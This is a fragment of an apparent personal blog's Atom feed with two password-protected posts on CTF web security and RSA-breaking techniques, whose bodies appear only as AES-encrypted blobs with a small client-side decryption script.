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</div><div id="enc_passwd"> <input id="enc_pwd_input" type="password" style="border-radius: 5px;border-style: groove;height: 30px;width: 50%;cursor: auto;font-size: 102%;color: currentColor;outline: none;text-overflow: initial;padding-left: 5px;" onkeydown="if (event.keyCode == 13) { decrypt(); return false;}"> <input type="submit" value="解&nbsp;密" onclick="decrypt()" style="width: 58px;height: 34px;border-radius: 5px;background-color: white;border-style: solid;color: currentColor;"><div id="enc_error" style="display: inline-block;color: #d84527;margin-left: 10px"></div><script>var onError = function(error) {showMessage("嘻嘻嘻，密码不对哦~", 5000);};function decrypt() {var passwd = document.getElementById("enc_pwd_input").value;console.log(passwd);doDecrypt(passwd, onError);}</script></div>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;ctf中web安全考察点知识点多种多样，现笔者不才，斗胆试着整理一下，也是对自己近一年来web所学做一次总结，由于整理并非非常完善，故此文将持续更新。&lt;/p&gt;
    
    </summary>
    
    
      <category term="web" scheme="https://winter3un.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>CTF-RSA破解方式整理</title>
    <link href="https://winter3un.github.io/2018/07/09/rsa-ctf/"/>
    <id>https://winter3un.github.io/2018/07/09/rsa-ctf/</id>
    <published>2018-07-10T00:51:05.000Z</published>
    <updated>2018-07-27T03:07:29.491Z</updated>
    
    <content type="html"><![CDATA[<script src=/js/crypto-js.js></script><script>function doDecrypt (pwd, onError) {console.log('in doDecrypt');const txt = document.getElementById('enc_content').innerHTML;let plantext;try {const bytes = CryptoJS.AES.decrypt(txt, pwd);var plaintext = bytes.toString(CryptoJS.enc.Utf8);showMessage('嘿！芝麻开门~~', 5000);} catch(err) {if(onError) {onError(err);}return;}document.getElementById('enc_content').innerHTML = plaintext;document.getElementById('enc_content').style.display = 'block';document.getElementById('enc_passwd').style.display = 'none';if(typeof MathJax !== 'undefined') {MathJax.Hub.Queue(['resetEquationNumbers', MathJax.InputJax.TeX],['PreProcess', MathJax.Hub],['Reprocess', MathJax.Hub]);}}</script><div id="enc_content" style="display:none">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